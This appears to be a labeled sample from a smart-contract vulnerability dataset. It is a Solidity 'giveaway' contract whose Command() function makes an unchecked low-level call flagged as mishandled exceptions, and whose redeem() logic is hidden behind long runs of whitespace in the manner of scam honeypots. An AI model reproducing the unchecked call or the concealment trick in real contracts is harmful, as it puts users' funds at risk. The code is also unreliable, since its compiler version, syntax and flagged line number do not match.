/*
 * @author: noamasamreen93
 * @vulnerable_at_lines: 45
 */

pragma solidity ^0.5.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function() public payable
    {
        
    }
   
    function redeem() public payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw() payable
    public
    { require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data) payable public
    {
        require(msg.sender == Owner);
        //<MishandledEx>
        adr.call.value(msg.value)(data);
    }
}